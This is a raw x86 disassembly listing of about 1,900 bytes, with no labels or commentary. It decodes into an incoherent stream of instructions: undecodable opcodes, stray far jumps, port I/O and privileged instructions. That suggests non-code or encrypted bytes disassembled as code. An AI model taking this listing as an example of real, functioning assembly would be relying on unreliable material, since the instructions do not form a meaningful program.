  41d8a0:	call   0xddcb:0xa6fdca7c
  41d8a7:	mov    ebx,0xa1a92f9
  41d8ac:	loopne 0x41d8d8
  41d8ae:	data16 scas al,BYTE PTR es:[edi]
  41d8b0:	pop    ebx
  41d8b1:	ror    DWORD PTR [edi],1
  41d8b3:	sahf   
  41d8b4:	mov    esi,0x955d370e
  41d8b9:	xchg   ecx,eax
  41d8ba:	sub    eax,0xdd380206
  41d8bf:	cmp    bh,BYTE PTR [ebx]
  41d8c1:	sbb    DWORD PTR [esi-0x6a5570d9],ebx
  41d8c7:	sub    DWORD PTR [ebx+0x74d27294],0x55
  41d8ce:	push   0x1b
  41d8d0:	push   0x1
  41d8d2:	loopne 0x41d8ee
  41d8d4:	lahf   
  41d8d5:	mov    ?,edi
  41d8d7:	dec    edx
  41d8d8:	int    0x1a
  41d8da:	inc    ecx
  41d8db:	or     BYTE PTR [edi],dl
  41d8dd:	adc    DWORD PTR [ebx-0x7a02b4e4],ebp
  41d8e3:	daa    
  41d8e4:	inc    esp
  41d8e5:	xor    ebx,ebx
  41d8e7:	pusha  
  41d8e8:	pop    edx
  41d8e9:	in     eax,dx
  41d8ea:	cmp    edi,DWORD PTR [edi-0x38cf858c]
  41d8f0:	or     DWORD PTR [ecx],ebx
  41d8f2:	jecxz  0x41d8f2
  41d8f4:	in     eax,0x59
  41d8f6:	mov    edx,ebp
  41d8f8:	ja     0x41d974
  41d8fa:	repz jle 0x41d919
  41d8fd:	out    0x73,eax
  41d8ff:	jmp    FWORD PTR [eax-0x69]
  41d902:	sub    ch,dl
  41d904:	stc    
  41d905:	xor    DWORD PTR [esi],eax
  41d907:	std    
  41d908:	ret    
  41d909:	pop    es
  41d90a:	or     ebp,DWORD PTR ds:0x1e5bbbc1
  41d910:	fbstp  TBYTE PTR [ebx]
  41d912:	ds push edx
  41d914:	loopne 0x41d93e
  41d916:	fist   WORD PTR ds:0x9cb0640c
  41d91d:	je     0x41d8a8
  41d91f:	sub    eax,0x4de9e3d7
  41d924:	adc    al,0x5
  41d926:	xor    DWORD PTR [ecx],edi
  41d928:	add    ebp,edx
  41d92a:	sub    bh,BYTE PTR [ecx]
  41d92c:	fabs   
  41d92e:	push   esp
  41d92f:	inc    edi
  41d930:	mov    ds:0x512b709d,al
  41d935:	pop    ecx
  41d936:	xlat   BYTE PTR ds:[ebx]
  41d937:	(bad)
  41d93a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d93b:	aas    
  41d93c:	pop    ecx
  41d93d:	es iret 
  41d93f:	xchg   ebx,eax
  41d940:	or     DWORD PTR [edi-0x77f8598e],edi
  41d946:	mov    eax,ds:0xc69a82bc
  41d94b:	das    
  41d94c:	push   ebp
  41d94d:	loopne 0x41d8ed
  41d94f:	xchg   esi,eax
  41d950:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d951:	jge    0x41d9b4
  41d953:	mov    al,BYTE PTR [edx+0x164a0414]
  41d959:	mov    cl,0x38
  41d95b:	jae    0x41d9c1
  41d95d:	out    dx,eax
  41d95e:	fiadd  DWORD PTR [eax]
  41d960:	aad    0xc9
  41d962:	inc    ecx
  41d963:	into   
  41d964:	fcmovnb st,st(6)
  41d966:	xchg   esi,eax
  41d967:	nop
  41d968:	test   al,0xda
  41d96a:	(bad)  
  41d96c:	loopne 0x41d986
  41d96e:	pop    esi
  41d96f:	mov    dl,0xbf
  41d971:	pop    esp
  41d972:	call   0x32f8:0x68021e2a
  41d979:	icebp  
  41d97a:	(bad)  
  41d97c:	add    BYTE PTR [edi+0x79a23c47],bl
  41d982:	popa   
  41d983:	or     ebp,DWORD PTR [ecx+0x56a54846]
  41d989:	xchg   esp,eax
  41d98a:	push   esi
  41d98b:	popf   
  41d98c:	addr16 adc eax,0x5285a588
  41d992:	or     esp,edi
  41d994:	xchg   DWORD PTR [ecx],ebp
  41d996:	scas   al,BYTE PTR es:[edi]
  41d997:	xchg   edx,eax
  41d998:	in     al,0x44
  41d99a:	repz push esp
  41d99c:	jp     0x41d9e7
  41d99e:	xor    esp,DWORD PTR [ebp+0x21ebc30]
  41d9a4:	pop    edi
  41d9a5:	jg     0x41d972
  41d9a7:	fsubr  st,st(5)
  41d9a9:	lahf   
  41d9aa:	test   edx,esi
  41d9ac:	(bad)  
  41d9ad:	aad    0x28
  41d9af:	sub    BYTE PTR [esi-0xb],dh
  41d9b2:	pop    si
  41d9b4:	fstp   TBYTE PTR [eax]
  41d9b6:	nop
  41d9b7:	fnsave [eax+0x609f2476]
  41d9bd:	icebp  
  41d9be:	and    ch,BYTE PTR [edx]
  41d9c0:	stos   DWORD PTR es:[edi],eax
  41d9c1:	dec    eax
  41d9c2:	xor    BYTE PTR [ebp+0x2a5a498],al
  41d9c8:	in     eax,dx
  41d9c9:	adc    BYTE PTR [esi+esi*8+0x50],al
  41d9cd:	xor    DWORD PTR [ebp-0x1953dc01],esp
  41d9d3:	test   al,0x74
  41d9d5:	int3   
  41d9d6:	arpl   WORD PTR ds:0x752bc0a1,bx
  41d9dc:	cli    
  41d9dd:	stos   DWORD PTR es:[edi],eax
  41d9de:	in     al,dx
  41d9df:	adc    ecx,DWORD PTR [ecx+eax*2]
  41d9e2:	and    BYTE PTR [eax+0x629c7d6a],dh
  41d9e8:	adc    eax,0x3721085d
  41d9ed:	outs   dx,BYTE PTR ds:[esi]
  41d9ee:	sub    al,0xd7
  41d9f0:	inc    esi
  41d9f1:	push   ss
  41d9f2:	outs   dx,BYTE PTR ds:[esi]
  41d9f4:	out    dx,eax
  41d9f5:	out    0x96,eax
  41d9f7:	jge    0x41da4d
  41d9f9:	push   ebx
  41d9fa:	call   0xe1a8:0x9a0c0099
  41da01:	call   0x1da69ac7
  41da06:	lock aaa 
  41da08:	nop
  41da09:	imul   DWORD PTR [ebx-0x33]
  41da0c:	ins    BYTE PTR es:[edi],dx
  41da0d:	cmc    
  41da0e:	push   ss
  41da0f:	sbb    dh,bh
  41da11:	hlt    
  41da12:	xchg   ebp,eax
  41da13:	inc    ebx
  41da14:	adc    al,0xa9
  41da16:	mov    ecx,0x63273481
  41da1b:	xchg   edi,eax
  41da1c:	cld    
  41da1d:	mov    ecx,ds
  41da1f:	leave  
  41da20:	loop   0x41da0e
  41da22:	iret   
  41da23:	and    DWORD PTR [ebx],ebx
  41da25:	inc    edx
  41da26:	mov    dh,0xf9
  41da28:	xchg   esp,eax
  41da29:	inc    ebp
  41da2a:	(bad)  
  41da2b:	leave  
  41da2c:	vpor   ymm5,ymm1,ymm4
  41da30:	sbb    al,0x39
  41da32:	test   DWORD PTR [ecx-0x7a],0xc7f9cf90
  41da39:	lahf   
  41da3a:	or     eax,0xcaed0c0b
  41da3f:	lock ja 0x41da59
  41da42:	mov    al,0xa
  41da44:	mov    bh,0xbe
  41da46:	(bad)  
  41da47:	pop    edi
  41da48:	test   dl,cl
  41da4a:	test   esp,ecx
  41da4c:	dec    edi
  41da4d:	loope  0x41da88
  41da4f:	mov    esp,0xbe9b40e1
  41da54:	jno    0x41da8e
  41da56:	mov    eax,cs
  41da58:	loop   0x41daaa
  41da5a:	jnp    0x41da4b
  41da5c:	push   ebp
  41da5d:	xchg   edi,eax
  41da5e:	cmp    al,BYTE PTR ds:0xe3471262
  41da64:	xor    BYTE PTR [edi+0xb],al
  41da67:	call   0xdd3d:0xe49d84e9
  41da6e:	or     BYTE PTR [ebx-0x2465a7ed],ah
  41da74:	push   ds
  41da75:	lods   al,BYTE PTR ds:[esi]
  41da76:	xchg   edx,eax
  41da77:	add    eax,DWORD PTR [edx-0x160aea5]
  41da7d:	repz dec esp
  41da7f:	mov    eax,ds:0xd1d46655
  41da84:	and    BYTE PTR [ecx],dh
  41da86:	and    DWORD PTR [ecx],esi
  41da88:	dec    edx
  41da89:	test   eax,0xda60da7e
  41da8e:	repz pop ebx
  41da90:	jle    0x41da45
  41da92:	jmp    0xb743:0x32be2483
  41da99:	ds ds ret 
  41da9c:	push   0xa3cc8c6b
  41daa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daa2:	and    DWORD PTR cs:[edx-0x4684112f],0xba62e90
  41daad:	test   ah,al
  41daaf:	sahf   
  41dab0:	(bad)  
  41dab1:	and    BYTE PTR [ecx+edx*4],0xe7
  41dab5:	inc    edi
  41dab6:	jg     0x41db08
  41dab8:	stos   DWORD PTR es:[edi],eax
  41dab9:	popa   
  41daba:	adc    dh,BYTE PTR [ecx+0x2987038b]
  41dac0:	mov    ebx,0xb95e61ed
  41dac5:	rcl    BYTE PTR [eax+eax*4+0x60],cl
  41dac9:	xchg   ebp,eax
  41daca:	fwait
  41dacb:	retf   0x978f
  41dace:	in     eax,0x10
  41dad0:	sbb    ebp,edx
  41dad2:	popf   
  41dad3:	shr    DWORD PTR [ecx+0x5d],1
  41dad6:	and    eax,0x32110d10
  41dadb:	iret   
  41dadc:	dec    eax
  41dadd:	std    
  41dade:	add    dh,BYTE PTR [eax-0x1962d8be]
  41dae4:	xor    bh,0xba
  41dae7:	mov    esp,0x524942f7
  41daec:	pop    ds
  41daed:	lahf   
  41daee:	inc    edx
  41daef:	push   es
  41daf0:	test   ch,cl
  41daf2:	add    al,0x42
  41daf4:	add    al,0xf
  41daf6:	mov    dh,0x61
  41daf8:	add    DWORD PTR [edi],ecx
  41dafa:	xor    edx,DWORD PTR [eax]
  41dafc:	cmc    
  41dafd:	push   esp
  41dafe:	mov    eax,0xb08c60a3
  41db03:	pop    ds
  41db04:	lods   eax,DWORD PTR ds:[esi]
  41db05:	jp     0x41db15
  41db07:	dec    edi
  41db08:	pop    es
  41db09:	inc    ebp
  41db0a:	repz (bad) 
  41db0c:	jnp    0x41dafe
  41db0e:	mov    ch,BYTE PTR [esi+0x30]
  41db11:	xor    BYTE PTR [ebp+0x3b7c5d14],dh
  41db17:	fbld   TBYTE PTR [ecx+eiz*2+0x2c]
  41db1b:	out    dx,eax
  41db1c:	cmp    eax,0x934d22f7
  41db21:	push   cs
  41db22:	fmul   QWORD PTR [esi+0x483e6066]
  41db28:	cmp    cl,ah
  41db2a:	loop   0x41db4e
  41db2c:	push   edi
  41db2d:	jb     0x41db44
  41db2f:	stc    
  41db30:	outs   dx,DWORD PTR ds:[esi]
  41db31:	dec    edi
  41db32:	lods   al,BYTE PTR ds:[esi]
  41db33:	jb     0x41db91
  41db35:	inc    esi
  41db36:	rcr    BYTE PTR [edx-0xc35d094],cl
  41db3c:	test   al,0x2a
  41db3e:	push   cs
  41db3f:	sahf   
  41db40:	add    ecx,DWORD PTR [ebx+0x243fa9d2]
  41db46:	stos   BYTE PTR es:[edi],al
  41db47:	je     0x41dae2
  41db49:	test   BYTE PTR [esi],cl
  41db4b:	into   
  41db4c:	inc    esi
  41db4d:	fsubrp st(2),st
  41db4f:	jecxz  0x41db8c
  41db51:	cmp    bh,BYTE PTR ds:0x725d5f33
  41db57:	in     eax,dx
  41db58:	mov    ah,0x0
  41db5a:	maskmovq mm2,(bad)
  41db5b:	not    DWORD PTR [ebp+0x555b2246]
  41db61:	mov    ch,0x72
  41db63:	retf   
  41db64:	out    0x63,al
  41db66:	dec    edx
  41db67:	retf   0xf75c
  41db6a:	cmp    cl,BYTE PTR [esi-0x36]
  41db6d:	and    BYTE PTR cs:[esi-0x43],0xa6
  41db72:	or     eax,0xdfb546cf
  41db77:	sbb    al,0x5
  41db79:	cmp    DWORD PTR ds:0xbacbdda4,0xa02ce207
  41db83:	or     esp,DWORD PTR [edi-0xe9092e7]
  41db89:	mov    eax,ds:0x8afd0a67
  41db8e:	jp     0x41dbe8
  41db90:	xchg   DWORD PTR [edi],esp
  41db92:	sub    al,0x35
  41db94:	push   ecx
  41db95:	dec    ecx
  41db96:	out    0xa0,eax
  41db98:	cmp    esp,DWORD PTR [esi+edi*8-0x5d]
  41db9c:	push   esp
  41db9d:	mov    BYTE PTR [ebp+0x1cdb8e27],dl
  41dba3:	retf   
  41dba4:	inc    esp
  41dba5:	cdq    
  41dba6:	mov    al,0x7e
  41dba8:	xor    ah,BYTE PTR [eax]
  41dbaa:	and    dh,BYTE PTR [eax]
  41dbac:	jo     0x41dc1a
  41dbae:	fdiv   st,st(1)
  41dbb0:	cmp    eax,0xf614dd5d
  41dbb5:	add    DWORD PTR [edx+edx*2+0x35],edi
  41dbb9:	pusha  
  41dbba:	push   edx
  41dbbb:	mov    al,ds:0x9c742f5d
  41dbc0:	ins    BYTE PTR es:[edi],dx
  41dbc1:	pop    ds
  41dbc2:	outs   dx,BYTE PTR ds:[esi]
  41dbc3:	fcomp  DWORD PTR [ebx+0x3b96df2]
  41dbc9:	xchg   BYTE PTR [eax+ecx*1-0x143490e],bl
  41dbd0:	mov    al,ds:0x9c6aec3d
  41dbd5:	pop    ds
  41dbd6:	mov    al,0xe7
  41dbd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbd9:	repnz cdq 
  41dbdb:	inc    esi
  41dbdc:	fst    DWORD PTR [eax+0x27]
  41dbdf:	fmul   QWORD PTR [edi-0x5d702d81]
  41dbe5:	jne    0x41db81
  41dbe7:	popf   
  41dbe8:	repz or DWORD PTR ds:0xb05c4e2,esi
  41dbef:	push   ebp
  41dbf0:	push   esp
  41dbf1:	aas    
  41dbf2:	inc    ecx
  41dbf3:	mov    esp,?
  41dbf5:	adc    edx,DWORD PTR [ebp+0x7f]
  41dbf8:	adc    esi,DWORD PTR [eax-0x2]
  41dbfb:	in     eax,0x4f
  41dbfd:	scas   eax,DWORD PTR es:[edi]
  41dbfe:	mov    bl,0x7b
  41dc00:	arpl   WORD PTR [eax+0x40],bp
  41dc03:	cdq    
  41dc04:	mov    eax,0xbcc508ca
  41dc09:	stos   BYTE PTR es:[edi],al
  41dc0a:	rol    BYTE PTR [ecx-0x6b],cl
  41dc0d:	gs gs push edx
  41dc10:	cmp    bl,BYTE PTR ds:[esp+esi*1+0x74]
  41dc15:	gs out dx,al
  41dc17:	rep stos BYTE PTR es:[edi],al
  41dc19:	mov    edi,0xb683dd81
  41dc1e:	lahf   
  41dc1f:	retf   0xa0fb
  41dc22:	pop    es
  41dc23:	int3   
  41dc24:	cli    
  41dc25:	rcr    BYTE PTR [edx-0x5cd00c53],0x89
  41dc2c:	xor    al,0xb4
  41dc2e:	cmc    
  41dc2f:	or     eax,0xd2499393
  41dc34:	jnp    0x41dc94
  41dc36:	sub    eax,0x22571a51
  41dc3b:	fdiv   QWORD PTR [edx]
  41dc3d:	cmp    eax,0xd8df75af
  41dc42:	dec    ebp
  41dc43:	repnz add ch,dh
  41dc46:	sti    
  41dc47:	xor    BYTE PTR [esi+0x347c9fff],0x8b
  41dc4e:	leave  
  41dc4f:	fistp  QWORD PTR [ebp-0x1726f965]
  41dc55:	jmp    0x41dc12
  41dc57:	aam    0x58
  41dc59:	add    dl,ch
  41dc5b:	fst    QWORD PTR [ebp-0x6c]
  41dc5e:	pusha  
  41dc5f:	aaa    
  41dc60:	cmp    eax,0xed6faa0a
  41dc65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc66:	es lahf 
  41dc68:	out    0xd2,eax
  41dc6a:	sub    al,bl
  41dc6c:	inc    ebx
  41dc6d:	or     DWORD PTR [edx+0x2f],ebx
  41dc70:	out    0x20,eax
  41dc72:	mov    ds:0x9224ff49,eax
  41dc77:	fld    st(1)
  41dc79:	push   ebp
  41dc7a:	das    
  41dc7b:	adc    dl,BYTE PTR [esi-0x5577c6b4]
  41dc81:	js     0x41dcb7
  41dc83:	mov    dl,0xe1
  41dc85:	xor    eax,0x73e7908d
  41dc8a:	or     al,0xc6
  41dc8c:	nop
  41dc8d:	pop    ebx
  41dc8e:	or     bl,BYTE PTR [ebp+0x7a9625f2]
  41dc94:	mov    ah,0xc8
  41dc96:	sub    al,0x42
  41dc98:	test   DWORD PTR [ebx+ebp*1+0x48],0x8dda9650
  41dca0:	bound  edi,QWORD PTR ds:0x7cad3735
  41dca6:	or     ebx,DWORD PTR [edx]
  41dca8:	outs   dx,DWORD PTR ds:[esi]
  41dca9:	sbb    DWORD PTR [ecx],esi
  41dcab:	popa   
  41dcac:	push   ecx
  41dcad:	sbb    eax,DWORD PTR [ecx+0x78a9cdc]
  41dcb3:	mov    WORD PTR [ebx],fs
  41dcb5:	jp     0x41dc60
  41dcb7:	(bad)  
  41dcb8:	jecxz  0x41dca0
  41dcba:	test   eax,0x72cabf70
  41dcbf:	pop    esi
  41dcc0:	test   eax,0x3a8b1519
  41dcc5:	popf   
  41dcc6:	push   cs
  41dcc7:	cmp    BYTE PTR [edi+0x69],al
  41dcca:	(bad)  
  41dccb:	stos   BYTE PTR es:[edi],al
  41dccc:	cmp    ecx,DWORD PTR [esi-0x10]
  41dccf:	xor    cl,al
  41dcd1:	and    al,0x1
  41dcd3:	sbb    ebp,DWORD PTR [eax+ebx*8-0x1f971b27]
  41dcda:	adc    al,0xe9
  41dcdc:	mov    esi,ebx
  41dcde:	jle    0x41dcac
  41dce0:	adc    ebp,DWORD PTR [ebp*4-0x614fe5c4]
  41dce7:	xor    al,0x3d
  41dce9:	stos   BYTE PTR es:[edi],al
  41dcea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dceb:	jge    0x41dc86
  41dced:	aaa    
  41dcee:	sbb    esp,0x6f
  41dcf1:	sbb    eax,0x9ecf3e07
  41dcf6:	push   ebp
  41dcf7:	out    0x2b,eax
  41dcf9:	and    edx,DWORD PTR [ecx+0x7]
  41dcfc:	fucomp st(1)
  41dcfe:	jmp    0x5c58:0xe7b5ed9b
  41dd05:	sbb    BYTE PTR [edx-0x72724224],dl
  41dd0b:	(bad)  
  41dd0c:	pop    ds
  41dd0d:	(bad)  
  41dd0e:	out    dx,eax
  41dd0f:	dec    ecx
  41dd10:	jp     0x41dd78
  41dd12:	ror    DWORD PTR [eax],cl
  41dd14:	mov    ebp,DWORD PTR [ecx]
  41dd16:	mov    bl,0xd1
  41dd18:	ja     0x41dcbf
  41dd1a:	and    ebx,ebx
  41dd1c:	dec    esp
  41dd1d:	lods   al,BYTE PTR ds:[esi]
  41dd1e:	mov    edi,0x884af17b
  41dd23:	xchg   edx,eax
  41dd24:	out    dx,eax
  41dd25:	dec    ebp
  41dd26:	mov    ds:0xb0348262,eax
  41dd2b:	je     0x41dd74
  41dd2d:	jmp    0x4f8e22ec
  41dd32:	dec    ecx
  41dd33:	inc    edx
  41dd34:	jg     0x41dcf3
  41dd36:	clc    
  41dd37:	rcr    BYTE PTR [edx+0x5e92328d],0xdb
  41dd3e:	int    0x20
  41dd40:	mov    al,0x4a
  41dd42:	xor    al,0xbc
  41dd44:	jmp    0x78c2:0x7a8dd6db
  41dd4b:	mov    esp,ebx
  41dd4d:	mov    cl,0xe
  41dd4f:	push   edx
  41dd50:	mov    WORD PTR [eax+0x2e413a81],gs
  41dd56:	xor    eax,0xa8661673
  41dd5b:	add    eax,0x3be33bf5
  41dd60:	pushf  
  41dd61:	int    0xa2
  41dd63:	ins    BYTE PTR es:[edi],dx
  41dd64:	retf   
  41dd65:	jecxz  0x41ddc2
  41dd67:	adc    BYTE PTR ds:0x6148afb2,0x84
  41dd6e:	fucomp st(0)
  41dd70:	push   es
  41dd71:	dec    esp
  41dd72:	out    0xf2,eax
  41dd74:	and    dl,BYTE PTR [esi]
  41dd76:	int    0xc1
  41dd78:	shl    BYTE PTR [edi-0x6f28ab41],0xbd
  41dd7f:	push   edi
  41dd80:	pop    ebx
  41dd81:	inc    BYTE PTR [esi]
  41dd83:	leave  
  41dd84:	jo     0x41dd6a
  41dd86:	inc    eax
  41dd87:	jmp    0xe7921256
  41dd8c:	sub    eax,0x14fdefeb
  41dd91:	push   esi
  41dd92:	fs push esi
  41dd94:	out    0x7b,al
  41dd96:	dec    eax
  41dd97:	inc    ecx
  41dd98:	ret    0xe0e0
  41dd9b:	dec    eax
  41dd9c:	adc    DWORD PTR [ebx],ecx
  41dd9e:	ret    
  41dd9f:	int    0x3d
  41dda1:	sub    ecx,eax
  41dda3:	jmp    0x41dded
  41dda5:	js     0x41ddb0
  41dda7:	sub    edx,DWORD PTR [edi]
  41dda9:	jns    0x41dde6
  41ddab:	clc    
  41ddac:	mov    ah,0xf4
  41ddae:	pushf  
  41ddaf:	cmp    al,0x7d
  41ddb1:	shl    BYTE PTR [eax],cl
  41ddb3:	shl    DWORD PTR [edx+0x75],cl
  41ddb6:	into   
  41ddb7:	inc    esi
  41ddb8:	cmp    al,0x77
  41ddba:	xlat   BYTE PTR ds:[ebx]
  41ddbb:	xor    al,0xda
  41ddbd:	inc    edi
  41ddbe:	push   esi
  41ddbf:	popa   
  41ddc0:	jecxz  0x41ddb1
  41ddc2:	pmullw mm3,QWORD PTR [edi+0x62]
  41ddc6:	sub    al,BYTE PTR [edi+0xf]
  41ddc9:	mov    ch,0xfb
  41ddcb:	push   ss
  41ddcc:	adc    BYTE PTR [edi],0xfd
  41ddcf:	add    BYTE PTR [esi],dh
  41ddd1:	std    
  41ddd2:	rcl    BYTE PTR [ebx],cl
  41ddd4:	(bad)  
  41ddd5:	loope  0x41ddd4
  41ddd7:	es xor cl,0xa0
  41dddb:	mov    ah,0x8
  41dddd:	loopne 0x41de19
  41dddf:	iret   
  41dde0:	sub    al,0x86
  41dde2:	mov    ch,BYTE PTR [esi-0x582c9190]
  41dde8:	xchg   esp,eax
  41dde9:	sbb    ebp,esi
  41ddeb:	push   ecx
  41ddec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dded:	jl     0x41de6c
  41ddef:	add    edx,DWORD PTR ds:0xe559df55
  41ddf5:	or     al,0x1f
  41ddf7:	dec    edi
  41ddf8:	ret    
  41ddf9:	mov    esp,0xc78385c3
  41ddfe:	imul   ebx,DWORD PTR [ecx+0x24cc553c],0xea6e3e01
  41de08:	lock xchg edx,eax
  41de0a:	jmp    0xd192:0x17c664
  41de11:	lock xchg ecx,eax
  41de13:	pop    esi
  41de14:	mov    eax,DWORD PTR [esi]
  41de16:	inc    ebx
  41de17:	inc    eax
  41de18:	dec    edx
  41de19:	(bad)  
  41de1a:	sbb    bl,BYTE PTR [edi]
  41de1c:	test   DWORD PTR [edx+0x86a908c],ebx
  41de22:	inc    ebp
  41de23:	mov    ecx,DWORD PTR [eax-0x65]
  41de26:	inc    edx
  41de27:	dec    edi
  41de28:	xlat   BYTE PTR ds:[ebx]
  41de29:	mov    cl,0x50
  41de2b:	adc    esi,DWORD PTR [ecx+0x3307a230]
  41de31:	enter  0x1f64,0x6d
  41de35:	and    bl,bh
  41de37:	clc    
  41de38:	das    
  41de39:	fld    st(0)
  41de3b:	ins    DWORD PTR es:[edi],dx
  41de3c:	or     BYTE PTR [esi+0x76298379],bh
  41de42:	pop    ds
  41de43:	dec    ebx
  41de44:	lahf   
  41de45:	sbb    bh,cl
  41de47:	adc    DWORD PTR [edi-0x42],ebx
  41de4a:	shl    BYTE PTR [edx],cl
  41de4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de4d:	cs (bad) 
  41de4f:	and    al,BYTE PTR [edi]
  41de51:	or     al,0xff
  41de53:	and    bl,BYTE PTR [edi+ebp*8-0x39]
  41de57:	pop    esi
  41de58:	add    eax,0x4d878139
  41de5d:	aaa    
  41de5e:	push   esi
  41de5f:	lea    eax,[ebx+edx*4-0x2d343f7e]
  41de66:	cmp    eax,0x9444065a
  41de6b:	sbb    eax,0x20d9da5
  41de70:	xchg   esp,eax
  41de71:	mov    esp,0xf7133bcb
  41de76:	pop    ebp
  41de77:	inc    edx
  41de78:	aaa    
  41de79:	fcmove st,st(3)
  41de7b:	adc    DWORD PTR [ebx],edi
  41de7d:	jnp    0x41dee8
  41de7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de80:	add    BYTE PTR [esi+0x73],ch
  41de83:	(bad)  
  41de84:	sbb    edi,DWORD PTR ds:0x1b13cdc5
  41de8a:	repz sahf 
  41de8c:	sti    
  41de8d:	jge    0x41de31
  41de8f:	add    eax,0xfae65a39
  41de94:	mov    esi,0x56b8d8c5
  41de99:	adc    BYTE PTR ds:0x4bdcd072,ch
  41de9f:	adc    ecx,edx
  41dea1:	cmp    al,0xfd
  41dea3:	mov    esp,0xffb788f1
  41dea8:	rol    edx,1
  41deaa:	mov    dl,0xb
  41deac:	fstp   QWORD PTR [ecx+0x1f]
  41deaf:	fdivr  st,st(0)
  41deb1:	popa   
  41deb2:	fmul   QWORD PTR [ecx]
  41deb4:	or     edi,DWORD PTR [eax-0x61]
  41deb7:	and    eax,0xf95507ad
  41debc:	aad    0x56
  41debe:	fmul   QWORD PTR [edi]
  41dec0:	xchg   ebx,eax
  41dec1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dec2:	add    ebp,ebx
  41dec4:	xor    edx,esi
  41dec6:	pop    ecx
  41dec7:	jo     0x41de95
  41dec9:	aam    0x14
  41decb:	jns    0x41de5c
  41decd:	popf   
  41dece:	mov    cl,0xfd
  41ded0:	les    eax,FWORD PTR [ebx-0x2382a3cf]
  41ded6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ded7:	cmp    al,0xfc
  41ded9:	and    DWORD PTR [eax],esp
  41dedb:	xor    ecx,DWORD PTR [esi]
  41dedd:	call   0x4a8a:0x351ae0de
  41dee4:	js     0x41def3
  41dee6:	inc    edx
  41dee7:	retf   
  41dee8:	jge    0x41df04
  41deea:	add    eax,0xccd3fac5
  41deef:	ins    DWORD PTR es:[edi],dx
  41def0:	fwait
  41def1:	data16 repz addr16 test al,0xe0
  41def6:	retf   0xa68b
  41def9:	mov    cl,0x45
  41defb:	hlt    
  41defc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41defd:	pop    edi
  41defe:	sbb    al,0x20
  41df01:	int    0x63
  41df03:	inc    edx
  41df04:	popa   
  41df05:	popa   
  41df06:	(bad)  
  41df07:	pusha  
  41df08:	ja     0x41de8b
  41df0a:	stos   DWORD PTR es:[edi],eax
  41df0b:	adc    BYTE PTR [edx+ecx*2-0x3f0d283],cl
  41df12:	push   ds
  41df13:	xor    eax,0x1acd7689
  41df18:	into   
  41df19:	ja     0x41dece
  41df1b:	push   ebp
  41df1c:	rol    DWORD PTR [edx+0x23f3475f],cl
  41df22:	andps  xmm3,xmm4
  41df25:	not    DWORD PTR [edi-0x21a4338]
  41df2b:	and    DWORD PTR [ebp-0x7c],esp
  41df2e:	inc    ecx
  41df2f:	xchg   edi,eax
  41df30:	xlat   BYTE PTR ds:[ebx]
  41df31:	mov    ah,0x7
  41df33:	mov    dh,0x44
  41df35:	or     ebp,DWORD PTR [ecx]
  41df37:	hlt    
  41df38:	xchg   BYTE PTR [ebx-0x57],bh
  41df3b:	jmp    0x4ed34062
  41df40:	cmp    al,0x1a
  41df42:	iret   
  41df43:	dec    eax
  41df44:	aaa    
  41df45:	push   cs
  41df46:	aam    0xbe
  41df48:	cmc    
  41df49:	(bad)  
  41df4a:	(bad)  
  41df4c:	mov    ss,WORD PTR ds:[esi]
  41df4f:	add    eax,0x27e9e307
  41df54:	pop    eax
  41df55:	mov    eax,0x56c9a735
  41df5a:	or     BYTE PTR [ecx],0xe8
  41df5d:	test   DWORD PTR [eax+0x13c585b7],edx
  41df63:	sbb    eax,0xd9691e4f
  41df68:	fstp   st(7)
  41df6a:	ins    BYTE PTR es:[edi],dx
  41df6b:	fdiv   QWORD PTR [di]
  41df6e:	add    ah,BYTE PTR [ecx]
  41df70:	jb     0x41df3d
  41df72:	dec    esi
  41df73:	cld    
  41df74:	adc    BYTE PTR [ebx+0x4ad2c0ca],0x63
  41df7b:	push   ebp
  41df7c:	mov    edx,ecx
  41df7e:	shl    ah,cl
  41df80:	push   esp
  41df81:	mov    dl,0x32
  41df83:	hlt    
  41df84:	dec    esp
  41df85:	stos   DWORD PTR es:[edi],eax
  41df86:	aam    0xf2
  41df88:	mov    edi,0x6cdfee16
  41df8d:	add    esi,DWORD PTR [edx+ecx*8+0x66c5c438]
  41df94:	inc    edi
  41df95:	sub    DWORD PTR [edx+0x3a],esp
  41df98:	xchg   esp,eax
  41df99:	inc    ecx
  41df9a:	es cdq 
  41df9c:	inc    esi
  41df9d:	iret   
  41df9e:	hlt    
  41df9f:	jle    0x41dfcc
  41dfa1:	sbb    ah,ah
  41dfa3:	fwait
  41dfa4:	jae    0x41dfa5
  41dfa6:	aam    0xa9
  41dfa8:	jecxz  0x41e00f
  41dfaa:	jne    0x41df4b
  41dfac:	into   
  41dfad:	mov    cl,0x67
  41dfaf:	retf   
  41dfb0:	add    DWORD PTR [edx-0x11b50d5d],eax
  41dfb6:	fwait
  41dfb7:	retf   
  41dfb8:	push   ebp
  41dfb9:	or     ch,BYTE PTR [ebp-0x4b69caab]
  41dfbf:	outs   dx,BYTE PTR ds:[esi]
  41dfc0:	dec    ecx
  41dfc1:	adc    al,0x31
  41dfc3:	push   edx
  41dfc4:	sar    bl,cl
  41dfc6:	(bad)  
  41dfc7:	dec    esp
  41dfc8:	not    DWORD PTR [ebx+edx*2+0x43044ba1]
  41dfcf:	mov    bh,0xb9
  41dfd1:	sahf   
  41dfd2:	push   ebx
  41dfd3:	dec    ecx
  41dfd4:	aam    0x4
  41dfd6:	xor    bh,BYTE PTR [edx+0x578edf61]
  41dfdc:	test   DWORD PTR [edi-0x5b],edi
  41dfdf:	jb     0x41e00e
  41dfe1:	jnp    0x41dff5
  41dfe3:	xchg   BYTE PTR [ebx],dl
  41dfe5:	xchg   edx,eax
  41dfe6:	aad    0x0
  41dfe8:	push   edi
  41dfe9:	sbb    BYTE PTR [ebp+eax*2+0x45a152f0],bh
  41dff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
